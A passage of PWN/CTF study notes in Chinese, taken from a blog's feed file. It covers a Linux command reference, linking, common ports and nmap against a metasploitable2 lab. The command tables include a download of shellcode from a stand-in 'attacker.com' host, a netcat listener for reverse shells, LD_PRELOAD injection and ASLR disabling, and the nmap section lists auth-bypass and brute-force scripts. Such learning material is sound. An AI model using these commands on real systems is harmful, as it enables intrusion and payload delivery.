class="headerlink" title="相对路径："></a>相对路径：</h2><p>不以根目录“&#x2F;”开始的路径，以当前目录作为起始点，特点是不以“&#x2F;”开头</p><p>每个目录下都有”.”和”..”2个目录：</p><p>一个点“ . ”代表当前目录，写全了“ .&#x2F; ”</p><p>二个点“ .. ”代表上一级目录，写全了“ ..&#x2F; ”</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> Linux安全机制 </category>
          
          <category> Linux基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux常用命令</title>
      <link href="/2025/06/2f21045a36ee.html"/>
      <url>/2025/06/2f21045a36ee.html</url>
      
        <content type="html"><![CDATA[<h1 id="终端命令格式"><a href="#终端命令格式" class="headerlink" title="终端命令格式"></a>终端命令格式</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">command</span> [-options] [parameter]</span><br></pre></td></tr></table></figure><p><strong>说明：</strong></p><p>·command ：命令名，相应功能的英文单词或单词的缩写<br>·[-options] ：选项，可用来对命令进行控制，也可以省略<br>·parameter ：传给命令的参数，可以是 零个、一个 或者 多个</p><h2 id="目录操作命令-cd、pwd、ls、mkdir、rmdir、du"><a href="#目录操作命令-cd、pwd、ls、mkdir、rmdir、du" class="headerlink" title="目录操作命令 cd、pwd、ls、mkdir、rmdir、du"></a>目录操作命令 cd、pwd、ls、mkdir、rmdir、du</h2><table><thead><tr><th>命令 &#x2F; 选项组合</th><th>功能说明</th></tr></thead><tbody><tr><td><strong>基础命令</strong></td><td></td></tr><tr><td><code>cd</code></td><td>切换到另一个目录</td></tr><tr><td><code>pwd</code></td><td>打印当前所在目录（print working directory ）</td></tr><tr><td><code>ls</code></td><td>列出目录内容</td></tr><tr><td><strong><code>ls</code> 常用选项</strong></td><td></td></tr><tr><td><code>ls -l</code></td><td>长格式输出文件，一个文件显示一行（简写 <code>ll</code> ）</td></tr><tr><td><code>ls -a</code></td><td>显示以 <code>.</code> 开头的隐藏文件（默认不显示隐藏文件 ）</td></tr><tr><td><code>ls -d</code></td><td>显示目录本身，而非目录下的文件（默认目录会展开显示内容 ）</td></tr><tr><td><code>ls -lh</code></td><td>长格式输出 + 字节数转 K&#x2F;M&#x2F;G （人性化阅读 ）</td></tr><tr><td><code>ls -t</code></td><td>按<strong>修改时间从晚到早</strong>排序文件（最近修改的先显示 ）</td></tr><tr><td><code>ls -tr</code></td><td>按<strong>修改时间从早到晚</strong>排序文件（最近修改的后显示 ）</td></tr><tr><td><code>ls -R</code></td><td>递归列出当前目录及所有子目录的文件（遍历嵌套目录 ）</td></tr><tr><td><strong>个人常用 <code>ls</code> 用法</strong></td><td><code>ll -ah</code> （长格式 + 显示隐藏文件 + 人性化字节数 ）</td></tr><tr><td><strong><code>mkdir</code></strong></td><td>创建目录；<code>-p</code> 选项可级联创建多层目录（如 <code>mkdir -p a/b/c</code> ）</td></tr><tr><td><strong><code>rmdir</code></strong></td><td>删除空目录；非空目录需用 <code>rm -rf 目录名</code> 强制删除（谨慎使用 <code>rm -rf</code> ）</td></tr><tr><td><strong><code>du</code> 命令及选项</strong></td><td></td></tr><tr><td><code>du</code></td><td>统计目录 &#x2F; 文件的磁盘占用字节数</td></tr><tr><td><code>du -s</code></td><td>只显示总字节数（不展开子文件 &#x2F; 目录 ）</td></tr><tr><td><code>du -h</code></td><td>字节数转 K&#x2F;M&#x2F;G （人性化阅读 ）</td></tr><tr><td><strong>个人常用 <code>du</code> 用法</strong></td><td><code>du -sh</code> （统计总占用 + 人性化字节数 ）</td></tr></tbody></table><h2 id="文件操作命令-which、touch、cp、mv、rm、file"><a href="#文件操作命令-which、touch、cp、mv、rm、file" class="headerlink" title="文件操作命令 which、touch、cp、mv、rm、file"></a>文件操作命令 which、touch、cp、mv、rm、file</h2><table><thead><tr><th><strong>命令</strong></th><th><strong>功能说明</strong></th><th><strong>语法示例</strong></th><th><strong>关键参数 &#x2F; 补充</strong></th></tr></thead><tbody><tr><td><code>which</code></td><td>查找命令在系统中的绝对路径</td><td><code>which cd</code> <code>which ls</code> <code>which date</code></td><td>- 仅查系统 <code>PATH</code> 路径内的可执行命令</td></tr><tr><td><code>touch</code></td><td>创建空文件 &#x2F; 更新文件修改时间</td><td><code>touch /root/aaa /root/bbb /root/ccc</code></td><td>- 无文件则创建，有文件则改<strong>修改时间</strong></td></tr><tr><td><code>cp</code></td><td>复制文件 &#x2F; 目录</td><td>复制文件： <code>cp /root/install.log /tmp</code> <code>cp /root/install.log /tmp/abc.log</code> 复制目录： <code>cp -R /root /tmp</code> <code>cp -R /root /tmp/abc</code></td><td><code>-R</code>：递归复制目录（必加） <code>-i</code>：覆盖前提示（默认隐藏，需手动开）</td></tr><tr><td><code>mv</code></td><td>移动文件 &#x2F; 目录 &#x2F; 重命名</td><td>移动： <code>mv /root/install.log.bak /tmp</code> 重命名： <code>mv /tmp/root /tmp/root1</code></td><td>- 移动 + 重命名可一步完成（如 <code>mv 旧路径 新路径</code> ）</td></tr><tr><td><code>rm</code></td><td>删除文件 &#x2F; 目录（<strong>危险操作</strong>）</td><td>删除文件： <code>rm /root/install.log.bak</code> 删除目录： <code>rm -rf /tmp/root1</code></td><td><code>-r</code>：递归删目录内容 <code>-f</code>：强制删除（无提示） <code>-i</code>：删除前逐一确认（建议日常用）</td></tr><tr><td><code>file</code></td><td>查看文件的类型（格式 &#x2F; 编码等）</td><td><code>file 文件名</code> 例：<code>file /root/install.log</code></td><td>- 可识别文本、二进制、压缩包等类型</td></tr></tbody></table><h2 id="查看登录用户命名-who、w"><a href="#查看登录用户命名-who、w" class="headerlink" title="查看登录用户命名 who、w"></a>查看登录用户命名 who、w</h2><table><thead><tr><th>命令</th><th>功能说明</th></tr></thead><tbody><tr><td><strong>who</strong></td><td><strong>当前用户登录的信息</strong></td></tr><tr><td><strong>w</strong></td><td><strong>当前用户登录的信息，以什么程序登录的</strong></td></tr></tbody></table><h2 id="文件内容查看命令-cat、tac、more、less、tail、head"><a href="#文件内容查看命令-cat、tac、more、less、tail、head" class="headerlink" title="文件内容查看命令 cat、tac、more、less、tail、head"></a>文件内容查看命令 cat、tac、more、less、tail、head</h2><table><thead><tr><th>命令</th><th>功能说明</th></tr></thead><tbody><tr><td>cat</td><td>查看文本文件内容，将文本文件内容全部打印到标准输出<br/>选项 -n 输出结果带行号</td></tr><tr><td>tac</td><td>查看文本文件内容，倒序输出<br/>按照行号倒序打印文本文件的内容</td></tr><tr><td>more</td><td>分页显示文件内容，例如：more &#x2F;root&#x2F;install.log<br/>默认显示进度百分比<br/>空格往下翻页，b往上翻页，f往下翻页，q退出</td></tr><tr><td>less</td><td>分页显示文件内容，例如：less &#x2F;root&#x2F;install.log<br/>选项 -m 显示进度百分比<br/>可以用“&#x2F;”后跟关键字搜索文件内容<br/>空格往下翻页，b往上翻页，f往下翻页，q退出</td></tr><tr><td>tail</td><td>查看文件尾部10行，例如：tail &#x2F;root&#x2F;install.log<br/>选项-N （N为正整数）可以指定显示末尾N行内容</td></tr><tr><td>head</td><td>查看文件头部10行，例如：head &#x2F;root&#x2F;install.log<br/>选项-N （N为正整数）可以指定显示头部N行内容</td></tr></tbody></table><h2 id="系统管理类命令-shutdown、reboot、lscpu"><a href="#系统管理类命令-shutdown、reboot、lscpu" class="headerlink" title="系统管理类命令 shutdown、reboot、lscpu"></a>系统管理类命令 shutdown、reboot、lscpu</h2><table><thead><tr><th>命令</th><th>功能说明</th></tr></thead><tbody><tr><td><strong>shutdown</strong></td><td><strong>关机命令</strong></br><strong>shutdown -h now 立刻关机</strong></br><strong>shutdown -h +10 “10分钟后关机”，每个登录用户收到“10分钟后关机”的消息，并于10分钟后关机</strong></br><strong>shutdown -c 取消关机</strong></td></tr><tr><td><strong>reboot</strong></td><td><strong>重启系统</strong></td></tr><tr><td><strong>lscpu</strong></td><td><strong>查看系统cpu信息</strong></td></tr></tbody></table><h1 id="查阅命令帮助信息"><a href="#查阅命令帮助信息" class="headerlink" title="查阅命令帮助信息"></a>查阅命令帮助信息</h1><h2 id="help"><a href="#help" class="headerlink" title="-help"></a>-help</h2><p>说明：显示 command 命令的帮助信息</p><h2 id="man"><a href="#man" class="headerlink" title="-man"></a>-man</h2><p>说明：</p><p>·查阅 command 命令的使用手册（man 是 manual 的缩写，是 Linux 提供的一个 手册，包含了绝大部分的命令、函数的详细使用）<br>·说明：使用 man 时的操作键</p><table><thead><tr><th>操作键</th><th>功能</th></tr></thead><tbody><tr><td>空格键</td><td>显示手册页的下一屏</td></tr><tr><td>Enter 键</td><td>一次滚动手册页的一行</td></tr><tr><td>b</td><td>回滚一屏</td></tr><tr><td>f</td><td>前滚一屏</td></tr><tr><td>q</td><td>退出</td></tr><tr><td>&#x2F;word</td><td>搜索 word 字符串</td></tr></tbody></table><h1 id="自动补全"><a href="#自动补全" class="headerlink" title="自动补全:"></a>自动补全:</h1><p>在敲出 文件 ／ 目录 ／ 命令 的前几个字母之后，按下 tab 键</p><p>如果输入的没有歧义，系统会自动补全<br>如果还存在其他 文件 ／ 目录 ／ 命令 ，再按一下 tab 键，系统会提示可能存在的命令<br>小技巧</p><p><strong><code>小技巧：</code></strong></p><p>ctrl + shift + &#x3D; 放大终端窗口的字体显示<br>ctrl + - 缩小终端窗口的字体显示</p><p>按 上 ／ 下 光标键可以在曾经使用过的命令之间来回切换<br>如果想要退出选择，并且不想执行当前选中的命令，可以按 ctrl + c</p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="文件分析命令（关键！）"><a href="#文件分析命令（关键！）" class="headerlink" title="文件分析命令（关键！）"></a>文件分析命令（关键！）</h2><table><thead><tr><th align="left">命令</th><th align="left">功能</th><th align="left">参数示例</th><th align="left">Pwn应用场景</th></tr></thead><tbody><tr><td align="left"><strong><code>file</code></strong></td><td align="left">查看文件类型</td><td align="left"><code>file ./vuln</code></td><td align="left">识别ELF类型（32&#x2F;64位）、动态&#x2F;静态链接</td></tr><tr><td align="left"><strong><code>checksec</code></strong></td><td align="left">检查安全机制</td><td align="left"><code>checksec --file=./vuln</code></td><td align="left">查看NX, PIE, Canary, RELRO等防护状态</td></tr><tr><td align="left"><strong><code>readelf</code></strong></td><td align="left">ELF文件分析</td><td align="left"><code>readelf -a ./vuln</code></td><td align="left">查看节头、符号表、重定位表、程序头</td></tr><tr><td align="left"><code>readelf -S</code></td><td align="left">查看节头信息</td><td align="left"><code>readelf -S ./vuln</code></td><td align="left">定位.text&#x2F;.plt&#x2F;.got等关键段地址</td></tr><tr><td align="left"><code>readelf -s</code></td><td align="left">查看符号表</td><td align="left">&#96;readelf -s .&#x2F;vuln</td><td align="left">grep system&#96;</td></tr><tr><td align="left"><strong><code>objdump</code></strong></td><td align="left">反汇编分析</td><td align="left"><code>objdump -d ./vuln</code></td><td align="left">反汇编代码段</td></tr><tr><td align="left"><code>objdump -M</code></td><td align="left">指定反汇编格式</td><td align="left"><code>objdump -M intel -d ./vuln</code></td><td align="left">Intel格式反汇编（更易读）</td></tr><tr><td align="left"><code>objdump -j</code></td><td align="left">反汇编特定段</td><td align="left"><code>objdump -j .plt -d ./vuln</code></td><td align="left">分析PLT表</td></tr><tr><td align="left"><strong><code>strings</code></strong></td><td align="left">提取字符串</td><td align="left">&#96;strings .&#x2F;vuln</td><td align="left">grep “&#x2F;bin&#x2F;sh”&#96;</td></tr><tr><td align="left"><strong><code>ldd</code></strong></td><td align="left">查看动态依赖</td><td align="left"><code>ldd ./vuln</code></td><td align="left">获取libc路径和基址偏移</td></tr></tbody></table><h2 id="调试分析命令（核心工具）"><a href="#调试分析命令（核心工具）" class="headerlink" title="调试分析命令（核心工具）"></a>调试分析命令（核心工具）</h2><table><thead><tr><th align="left">命令</th><th align="left">功能</th><th align="left">参数示例</th><th align="left">Pwn应用场景</th></tr></thead><tbody><tr><td align="left"><strong><code>gdb</code></strong></td><td align="left">GNU调试器</td><td align="left"><code>gdb ./vuln</code></td><td align="left">动态调试分析</td></tr><tr><td align="left"><code>gdb -p</code></td><td align="left">附加进程</td><td align="left"><code>gdb -p &lt;pid&gt;</code></td><td align="left">调试运行中的程序</td></tr><tr><td align="left"><code>gdb -ex</code></td><td align="left">执行命令</td><td align="left"><code>gdb -ex &quot;b main&quot; -ex &quot;r&quot; ./vuln</code></td><td align="left">自动化调试任务</td></tr><tr><td align="left"><strong><code>strace</code></strong></td><td align="left">系统调用跟踪</td><td align="left"><code>strace ./vuln</code></td><td align="left">监控系统调用（如execve）</td></tr><tr><td align="left"><strong><code>ltrace</code></strong></td><td align="left">库函数跟踪</td><td align="left"><code>ltrace ./vuln</code></td><td align="left">监控库函数调用（如malloc）</td></tr><tr><td align="left"><strong><code>pwndbg</code></strong></td><td align="left">增强版GDB</td><td align="left">-</td><td align="left">专为Pwn设计的GDB插件</td></tr><tr><td align="left"><code>info proc</code></td><td align="left">查看进程信息</td><td align="left"><code>info proc mappings</code></td><td align="left">查看内存映射布局</td></tr></tbody></table><h2 id="网络操作命令（漏洞利用必备）"><a href="#网络操作命令（漏洞利用必备）" class="headerlink" title="网络操作命令（漏洞利用必备）"></a>网络操作命令（漏洞利用必备）</h2><table><thead><tr><th align="left">命令</th><th align="left">功能</th><th align="left">参数示例</th><th align="left">Pwn应用场景</th></tr></thead><tbody><tr><td align="left"><strong><code>nc</code></strong></td><td align="left">网络工具</td><td align="left"><code>nc -lvp 4444</code></td><td align="left">监听端口（接收反弹shell）</td></tr><tr><td align="left"></td><td align="left"></td><td align="left"><code>nc 192.168.1.100 1337</code></td><td align="left">连接远程漏洞服务</td></tr><tr><td align="left"><strong><code>socat</code></strong></td><td align="left">高级网络工具</td><td align="left"><code>socat TCP-LISTEN:4444,reuseaddr,fork EXEC:./vuln</code></td><td align="left">稳定连接（用于ROP链开发）</td></tr><tr><td align="left"><strong><code>curl</code></strong></td><td align="left">HTTP客户端</td><td align="left"><code>curl http://target:8080/exploit</code></td><td align="left">Web Pwn题利用</td></tr><tr><td align="left"><strong><code>wget</code></strong></td><td align="left">文件下载</td><td align="left"><code>wget http://attacker.com/shellcode.bin</code></td><td align="left">下载远程payload</td></tr></tbody></table><h2 id="进程管理命令"><a href="#进程管理命令" class="headerlink" title="进程管理命令"></a>进程管理命令</h2><table><thead><tr><th align="left">命令</th><th align="left">功能</th><th align="left">参数示例</th><th align="left">Pwn应用场景</th></tr></thead><tbody><tr><td align="left"><strong><code>ps</code></strong></td><td align="left">查看进程</td><td align="left">&#96;ps aux</td><td align="left">grep vuln&#96;</td></tr><tr><td align="left"><strong><code>kill</code></strong></td><td align="left">终止进程</td><td align="left"><code>kill -9 &lt;pid&gt;</code></td><td align="left">强制结束崩溃的程序</td></tr><tr><td align="left"><strong><code>pkill</code></strong></td><td align="left">按名杀进程</td><td align="left"><code>pkill -f vuln</code></td><td align="left">快速结束目标程序</td></tr><tr><td align="left"><strong><code>top</code></strong></td><td align="left">实时进程监控</td><td align="left"><code>top</code></td><td align="left">监控资源占用情况</td></tr><tr><td align="left"><strong><code>nohup</code></strong></td><td align="left">后台运行</td><td align="left"><code>nohup ./vuln &amp;</code></td><td align="left">保持服务运行</td></tr></tbody></table><h2 id="环境配置命令"><a href="#环境配置命令" class="headerlink" title="环境配置命令"></a>环境配置命令</h2><table><thead><tr><th align="left">命令</th><th align="left">功能</th><th align="left">参数示例</th><th align="left">Pwn应用场景</th></tr></thead><tbody><tr><td align="left"><strong><code>export</code></strong></td><td align="left">环境变量</td><td align="left"><code>export LD_PRELOAD=./libc.so.6</code></td><td align="left">预加载库（库注入攻击）</td></tr><tr><td align="left"></td><td align="left"></td><td align="left"><code>export PYTHONPATH=/path/to/pwntools</code></td><td align="left">设置Python路径</td></tr><tr><td align="left"><strong><code>ulimit</code></strong></td><td align="left">资源限制</td><td align="left"><code>ulimit -c unlimited</code></td><td align="left">启用core dump</td></tr><tr><td align="left"><strong><code>setarch</code></strong></td><td align="left">设置架构</td><td align="left"><code>setarch </code>uname -m<code> -R ./vuln</code></td><td align="left">禁用ASLR（地址随机化）</td></tr><tr><td align="left"><strong><code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code></strong></td><td align="left">全局禁用ASLR</td><td align="left">需要root权限</td><td align="left">调试环境配置</td></tr></tbody></table><h2 id="二进制处理命令"><a href="#二进制处理命令" class="headerlink" title="二进制处理命令"></a>二进制处理命令</h2><table><thead><tr><th align="left">命令</th><th align="left">功能</th><th align="left">参数示例</th><th align="left">Pwn应用场景</th></tr></thead><tbody><tr><td align="left"><strong><code>xxd</code></strong></td><td align="left">十六进制查看</td><td align="left">&#96;xxd .&#x2F;vuln</td><td align="left">head&#96;</td></tr><tr><td align="left"><strong><code>hexedit</code></strong></td><td align="left">十六进制编辑</td><td align="left"><code>hexedit ./vuln</code></td><td align="left">手动修改二进制文件</td></tr><tr><td align="left"><strong><code>patchelf</code></strong></td><td align="left">ELF修补</td><td align="left"><code>patchelf --set-interpreter /lib/ld-linux.so.2 ./vuln</code></td><td align="left">修改动态链接器</td></tr><tr><td align="left"></td><td align="left"></td><td align="left"><code>patchelf --replace-needed libc.so.6 ./libc_target.so ./vuln</code></td><td align="left">替换依赖库</td></tr><tr><td align="left"><strong><code>objcopy</code></strong></td><td align="left">目标文件操作</td><td align="left"><code>objcopy --dump-section .text=text.bin ./vuln</code></td><td align="left">提取代码段</td></tr></tbody></table><h2 id="开发辅助命令"><a href="#开发辅助命令" class="headerlink" title="开发辅助命令"></a>开发辅助命令</h2><table><thead><tr><th align="left">命令</th><th align="left">功能</th><th align="left">参数示例</th><th align="left">Pwn应用场景</th></tr></thead><tbody><tr><td align="left"><strong><code>python</code></strong></td><td align="left">Python解释器</td><td align="left"><code>python3 exploit.py</code></td><td align="left">运行漏洞利用脚本</td></tr><tr><td align="left"><strong><code>pip</code></strong></td><td align="left">Python包管理</td><td align="left"><code>pip install pwntools</code></td><td align="left">安装Pwn工具库</td></tr><tr><td align="left"><strong><code>gcc</code></strong></td><td align="left">编译器</td><td align="left"><code>gcc -fno-stack-protector -z execstack vuln.c -o vuln</code></td><td align="left">编译含漏洞程序</td></tr><tr><td align="left"><strong><code>make</code></strong></td><td align="left">构建工具</td><td align="left"><code>make</code></td><td align="left">编译CTF题目</td></tr><tr><td align="left"><strong><code>tmux</code></strong></td><td align="left">终端复用器</td><td align="left"><code>tmux new -s pwn</code></td><td align="left">管理多个调试窗口</td></tr></tbody></table><h2 id="信息搜索命令"><a href="#信息搜索命令" class="headerlink" title="信息搜索命令"></a>信息搜索命令</h2><table><thead><tr><th align="left">命令</th><th align="left">功能</th><th align="left">参数示例</th><th align="left">Pwn应用场景</th></tr></thead><tbody><tr><td align="left"><strong><code>grep</code></strong></td><td align="left">文本搜索</td><td align="left">&#96;objdump -d .&#x2F;vuln</td><td align="left">grep “call”&#96;</td></tr><tr><td align="left"><strong><code>find</code></strong></td><td align="left">文件查找</td><td align="left"><code>find / -name &quot;libc.so.6&quot; 2&gt;/dev/null</code></td><td align="left">查找libc库</td></tr><tr><td align="left"><strong><code>which</code></strong></td><td align="left">命令定位</td><td align="left"><code>which gdb</code></td><td align="left">查找工具路径</td></tr><tr><td align="left"><strong><code>man</code></strong></td><td align="left">手册查看</td><td align="left"><code>man 2 execve</code></td><td align="left">查看系统调用文档</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> Linux安全机制 </category>
          
          <category> Linux基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/06/9acda07248c0.html"/>
      <url>/2025/06/9acda07248c0.html</url>
      
        <content type="html"><![CDATA[<p>title: 可执行文件装载与虚拟内存<br>date: 2025-06-28 20:16:36<br>categories:   - PWN -ELF文件格式</p><p>tags: </p><p><img src="/./../../../../../images/image-20250629232102031.png" alt="image-20250629232102031"></p><p><img src="/./../../../../../images/image-20250629232917087.png" alt="image-20250629232917087"></p><p><img src="/./../../../../../images/image-20250629233100682.png" alt="image-20250629233100682"></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 二进制文件 </category>
          
          <category> 2-ELF文件格式 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/06/be611c228fd6.html"/>
      <url>/2025/06/be611c228fd6.html</url>
      
        <content type="html"><![CDATA[<p>title: 动态链接<br>date: 2025-06-29 20:16:36<br>categories:   -PWN -二进制文件 -ELF文件链接</p><p>tags: </p><h1 id="动态链接（Dynamic-Linking）"><a href="#动态链接（Dynamic-Linking）" class="headerlink" title="动态链接（Dynamic Linking）"></a>动态链接（Dynamic Linking）</h1><ul><li>定义：在运行阶段通过动态链接器（如 Linux 的<code>ld-linux.so</code>）加载所需的共享库（如<code>.so</code>文件）。</li><li>特点：<ul><li>可执行文件体积小，仅包含对共享库的引用。</li><li>多个程序可共享同一库的内存实例，节省资源。</li><li>依赖系统环境中已安装的共享库，部署时需确保库版本兼容。</li></ul></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 编译源代码为目标文件（位置无关代码）</span></span><br><span class="line">gcc -fPIC -c utils.c -o utils.o</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建共享库</span></span><br><span class="line">gcc -shared utils.o -o libutils.so</span><br><span class="line"></span><br><span class="line"><span class="comment"># 动态链接生成可执行文件</span></span><br><span class="line">gcc main.o -L. -lutils -o main_dynamic</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行前设置库搜索路径（临时）</span></span><br><span class="line"><span class="built_in">export</span> LD_LIBRARY_PATH=<span class="variable">$LD_LIBRARY_PATH</span>:.</span><br><span class="line">./main_dynamic</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 二进制文件 </category>
          
          <category> 3-ELF 文件链接 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>静态链接</title>
      <link href="/2025/06/19c857e8afbe.html"/>
      <url>/2025/06/19c857e8afbe.html</url>
      
        <content type="html"><![CDATA[<h1 id="静态链接（Static-Linking）"><a href="#静态链接（Static-Linking）" class="headerlink" title="静态链接（Static Linking）"></a>静态链接（Static Linking）</h1><ul><li>定义：在编译阶段将所有依赖的库文件（如<code>.a</code>静态库）直接合并到可执行文件中。</li><li>特点：<ul><li>可执行文件独立运行，无需外部依赖。</li><li>生成文件体积大，包含所有必要代码。</li><li>适合部署环境不稳定或对运行速度要求高的场景。</li></ul></li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 编译源代码为目标文件</span></span><br><span class="line">gcc -c main.c -o main.o</span><br><span class="line">gcc -c utils.c -o utils.o</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建静态库</span></span><br><span class="line">ar rcs libutils.a utils.o</span><br><span class="line"></span><br><span class="line"><span class="comment"># 静态链接生成可执行文件</span></span><br><span class="line">gcc -static main.o -L. -lutils -o main_static</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 二进制文件 </category>
          
          <category> 3-ELF 文件链接 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/06/2167c014e2bb.html"/>
      <url>/2025/06/2167c014e2bb.html</url>
      
        <content type="html"><![CDATA[<p>title: 端口服务信息<br>date: 2025-06-29 20:16:36<br>categories:<br>tags: -渗透测试</p><h1 id="扫描的思路和代码实现"><a href="#扫描的思路和代码实现" class="headerlink" title="扫描的思路和代码实现"></a>扫描的思路和代码实现</h1><h2 id="一个服务一个端口"><a href="#一个服务一个端口" class="headerlink" title="一个服务一个端口"></a>一个服务一个端口</h2><h2 id="查看本机端口信息"><a href="#查看本机端口信息" class="headerlink" title="查看本机端口信息"></a>查看本机端口信息</h2><h6 id="windows"><a href="#windows" class="headerlink" title="windows:"></a>windows:</h6><p>netstat -aon|findstr 3306</p><h6 id="Linux"><a href="#Linux" class="headerlink" title="Linux:"></a>Linux:</h6><p>netstat -an|grep 3306</p><p>若未显示结果，说明对应服务未启动（如示例中的MySQL和80端口服务）</p><h2 id="远程机器端口"><a href="#远程机器端口" class="headerlink" title="远程机器端口"></a>远程机器端口</h2><p>telnet 192.168.142.130 80</p><p>wget 192.168.142.130 80</p><p>nc -vz 192.168.142.130 445</p><p>python代码扫描 wscan.py（批量扫描）</p><p>nc -vz 192.168.142.130 80-9000（netcat有扫描功能，能显示服务名称）</p><h1 id="常见端口"><a href="#常见端口" class="headerlink" title="常见端口"></a>常见端口</h1><p><a href="https://nsrc.org/workshops/2009/summer/presentations/day3/common-ports.pdf">(Cheat Sheet - Common Ports)</a></p><h2 id="文件共享服务"><a href="#文件共享服务" class="headerlink" title="文件共享服务"></a>文件共享服务</h2><p>21&#x2F;22&#x2F;69：FTP&#x2F;SFTP文件传输协议<br>2049：NFS服务（Network File System）<br>139：Samba服务<br>389：LDAP目录访问协议（Light Directory Access Portocol）</p><h2 id="远程连接服务"><a href="#远程连接服务" class="headerlink" title="远程连接服务"></a>远程连接服务</h2><p>22：SSH远程连接<br>23：Telnet远程连接<br>3389：RDP远程桌面连接<br>5900：VNC远程连接<br>5632：PcAnywhere远程控制服务</p><h2 id="Web应用服务"><a href="#Web应用服务" class="headerlink" title="Web应用服务"></a>Web应用服务</h2><p>80&#x2F;443&#x2F;8080：常见的web服务端口<br>7001&#x2F;7002：Weblogic控制台<br>8080&#x2F;8089：Jboss&#x2F;resin&#x2F;jetty&#x2F;Jenkins</p><p>9090：Websphere控制台<br>4848：Glassfish控制台<br>1352：Lotus domino邮件服务<br>10000：Webmin-web控制面板</p><h2 id="数据库服务"><a href="#数据库服务" class="headerlink" title="数据库服务"></a>数据库服务</h2><p>3306：MySQL<br>1433：MSSQL数据库<br>1521：Oracle数据库<br>5432：PostgreSQL数据库<br>27017&#x2F;27018：MongoDB<br>6379：Redis数据库<br>5000：Sysbase&#x2F;DB2数据库</p><h2 id="邮件服务"><a href="#邮件服务" class="headerlink" title="邮件服务"></a>邮件服务</h2><p>25：SMTP邮件服务<br>110：POP3协议<br>143：IMAP协议</p><h2 id="网络常见协议"><a href="#网络常见协议" class="headerlink" title="网络常见协议"></a>网络常见协议</h2><p>53：DNS域名系统<br>67&#x2F;68：DHCP服务<br>161：SNMP协议</p><h2 id="特殊服务"><a href="#特殊服务" class="headerlink" title="特殊服务"></a>特殊服务</h2><p>2181：Zookeeper服务<br>8069：Zabbix服务<br>9200&#x2F;9300：Elasticsearch服务<br>11211：Memcached服务<br>512&#x2F;513&#x2F;514：Linux Rexec服务<br>873：Rsync服务<br>3690：SVN服务<br>50000：SAP Management Console</p><h1 id="metasploitable2靶机"><a href="#metasploitable2靶机" class="headerlink" title="metasploitable2靶机"></a>metasploitable2靶机</h1><p>链接：<a href="https://pan.baidu.com/s/1u-MTtxATAfhE5ELnhCS-Fg">https://pan.baidu.com/s/1u-MTtxATAfhE5ELnhCS-Fg</a><br>提取码：8888 </p><p>下载、解压、导入VM<br>默认用户名密码 msfadmin&#x2F;msfadmin<br>修改root密码 sudo passwd root<br>ifconfig查看IP</p><h1 id="端口扫描工具NMap（Network-Mapper）"><a href="#端口扫描工具NMap（Network-Mapper）" class="headerlink" title="端口扫描工具NMap（Network Mapper）"></a>端口扫描工具NMap（Network Mapper）</h1><h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><p><a href="https://nmap.org/">Nmap：网络映射器 - 免费的安全扫描程序</a></p><p>图形界面：zenmap</p><p>主要功能<br>1）扫描主机(Host Discovery)<br>2）扫描端口(Port Scanning)<br>3）探测操作系统、软件版本 (Operating System Detection、Version Detection)</p><h2 id="参数分类"><a href="#参数分类" class="headerlink" title="参数分类"></a>参数分类</h2><p><a href="https://nmap.org/book/man.html">第 15 章.Nmap 参考指南 |Nmap 网络扫描</a></p><p>nmap –help</p><p>TARGET SPECIFICATION:目标，对什么进行扫描，比如是域名、IP或者网络<br>HOST DISCOVERY:主机发现，怎么对主机进行扫描，比如简单扫描，还是全部扫一遍，或者用<br>相应的协议扫<br>SCAN TECHNIQUES:扫描技术，协议的设置<br>PORT SPECIFICATION AND SCAN ORDER:端口和扫描顺序设置<br>SERVICE&#x2F;VERSION DETECTION:服务和版本识别<br>SCRIPT SCAN:使用脚本，nmap本身内置了大量的lua脚本，而且还可以自己编写脚本</p><p>【nmap本身内置了大量的lua脚本，而且还可以自己编写脚本<br>ls &#x2F;usr&#x2F;share&#x2F;nmap&#x2F;scripts&#x2F; | wc -l<br>全部清单：<a href="https://nmap.org/nsedoc/index.html">https://nmap.org/nsedoc/index.html</a><br>例如：<br>nmap 192.168.142.137 –script http-enum 列举HTTP服务<br>nmap –script&#x3D;auth 绕过鉴权<br>nmap –script&#x3D;brute 暴力破解<br>nmap –script&#x3D;vuln 扫描漏洞】</p><p>OS DETECTION:操作系统识别<br>TIMING AND PERFORMANCE:时间和性能设置，比如扫描频率、重试次数等等<br>FIREWALL&#x2F;IDS EVASION AND SPOOFING:防火墙绕过和欺骗，比如使用代理，假IP等<br>OUTPUT:把扫描接出输出到文件<br>MISC: 杂项：启用IPv6等等配置参数示例</p><h2 id="参数示例"><a href="#参数示例" class="headerlink" title="参数示例"></a>参数示例</h2><p>nmap 192.168.142.133 # metasploitable2 